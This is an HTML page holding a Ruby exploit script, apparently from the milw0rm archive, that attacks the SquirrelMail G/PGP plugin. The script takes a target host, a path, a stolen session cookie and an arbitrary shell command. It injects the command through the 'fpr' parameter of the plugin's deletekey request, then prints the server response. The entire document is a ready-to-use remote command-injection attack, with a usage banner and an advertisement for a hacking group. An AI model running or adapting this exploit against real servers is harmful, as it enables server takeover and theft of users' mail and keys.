<html><head><title>SquirrelMail G/PGP Plugin deletekey() Command Injection Exploit</title></head><pre>#!/usr/local/bin/ruby

puts&quot;http://backdoored.net\n&quot;
puts &quot;SquirrelMail G/PG deletekey() command injection exploit\n&quot;
puts &quot;http://backdoored.net    Visit Us\n&quot;
puts &quot;Coded by Backdoored member.   \n&quot; 
puts &quot;--------------------------------------------------\n&quot;

if ARGV[0] == nil &amp;&amp; ARGV[1] == nil &amp;&amp; ARGV[2] ==  nil &amp;&amp; ARGV[3] == nil &amp;&amp; ARGV[4] == nil &amp;&amp; ARGV[5] == nil
puts &quot;Usage: ./squ_xploit  hostname path port cookie command 0\n&quot;
puts &quot;if host using ssl use 1 instead of 0\n&quot;
exit
end

require 'net/http'
require 'net/https'

host = ARGV[0].to_s
port = ARGV[2].to_i
cookie = ARGV[3].to_s
victim = Net::HTTP.new(host,port)
	if ARGV[3].to_i == 1
	puts &quot;Entering SSL mode baby\n&quot;
	victim.use_ssl = true
	end
command = ARGV[4].to_s
#path = '/sq/plugins/gpg/modules/keyring_main.php'
path = ARGV[1].to_s
data = &quot;id=C5B1611B8E71C***&amp;fpr= | &quot; + command + &quot;| &amp;pos=0&amp;sort=email_name&amp;desc=&amp;srch=&amp;ring=all&amp;passphrase=&amp;deletekey=true&amp;deletepair=false&amp;trust=1&quot;
pizza = &quot;key=pYWrEbVTY%2Bc%3D; SQMSESSID=&quot; + cookie;
headers = {
  'Cookie' =&gt; pizza,
  'Referer' =&gt; 'http://www.google.com',
  'Content-Type' =&gt; 'application/x-www-form-urlencoded'
}
resp, data = victim.post(path,data,headers)
puts 'Message = ' + resp.message
puts  'Code = ' + resp.code

resp.each {|key,val| puts key + ' = ' + val}
#puts data

# milw0rm.com [2007-12-11]</pre></html>